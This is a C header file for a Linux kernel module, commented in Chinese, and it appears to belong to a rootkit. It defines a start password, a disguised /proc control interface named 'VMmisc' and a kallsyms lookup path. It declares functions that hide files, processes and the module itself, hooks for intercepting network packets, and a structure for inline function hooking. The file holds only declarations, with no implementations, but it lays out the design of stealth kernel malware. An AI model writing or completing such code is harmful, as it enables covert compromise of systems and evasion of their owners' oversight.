/**
 * 配置文件头文件
 * 定义整个项目的配置参数、宏定义和数据结构
 * 包含内核版本兼容性处理和调试开关
 */

#ifndef CONFIG_H
#define CONFIG_H
#include <linux/fs.h>
#include <linux/version.h>

// 调试消息开关 - 注释掉可关闭调试输出
//#define DEBUG_MSG

// 添加内核版本兼容性定义
#ifndef LINUX_VERSION_CODE
#include <linux/version.h>
#endif

// 启动密码 - 用于验证模块加载
#define _START_PASS		"testtest"		// qwer1234

// 控制接口名称 - 在/proc目录下创建的控制接口
#define CTL_PROC_NAME	"VMmisc"	// /proc/VMmisc 
//----------------------------------------------------------------------------

// 添加缺失的宏定义
#ifndef KALLSYMS_PATH
#define KALLSYMS_PATH "/proc/kallsyms"
#endif

/**
 * 调试宏定义
 * 在调试模式下输出函数名和行号信息
 * 非调试模式下不执行任何操作
 */
#ifdef DEBUG_MSG
#define debug(format, args...) \
        printk("function:%s-L%d: " format, __FUNCTION__, __LINE__, ##args);
#else
#define debug(format, args...)  do {} while(0);
#endif

// 内核路径和名称缓冲区
static char _kpath[512] = {0};
static char _kname[128] = {0};	// max len 7

//----------------------------------------------------------------------------------------
// 钩子函数声明
extern int _init1(void);
extern void _init2(void);

// 网络包处理函数声明
extern int pktinit1(void);
extern void pktinit2(void);
extern int packi(struct sk_buff *skb);
extern int packo(struct sk_buff *skb);

// 文件隐藏函数声明
void file_hide( char *name );
void file_unhide( char *name );

// 模块隐藏函数声明
void hide(void);
void show(void);

// 进程隐藏函数声明
static void pid_hide(long pid);
static void pid_unhide(long pid);

// 工具函数初始化声明
extern int init_util_func(void);

// 修复set_memory_x兼容性 - 针对新版本内核
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
#ifndef set_memory_x_t
typedef int (*set_memory_x_t)(unsigned long addr, int numpages);
#endif
extern set_memory_x_t *ptr_mem_x;
#else
// 对于老版本内核，使用兼容性定义
typedef int (*set_memory_x_t)(unsigned long addr, int numpages);
extern set_memory_x_t *ptr_mem_x;
#endif

// 定义ptr_mem_x变量
set_memory_x_t *ptr_mem_x = NULL;

//----------------------------------------------------------------------------------------

/**
 * 钩子结构体定义
 * 用于存储被钩子函数的原始信息和替换函数
 */
typedef struct
{
	/* 目标函数名称 */
	char *name;

	/* 原始函数备份 */
	void *stub_bak;

	/* 钩子处理函数地址 */
	void *handler;

	/* 目标函数指令长度 */
	int length;

	/* 目标函数地址和读写映射 */
	void *target;
	void *target_map;

	/* 使用计数 - 原子操作 */
	atomic_t usage;
} hook_t;

#endif
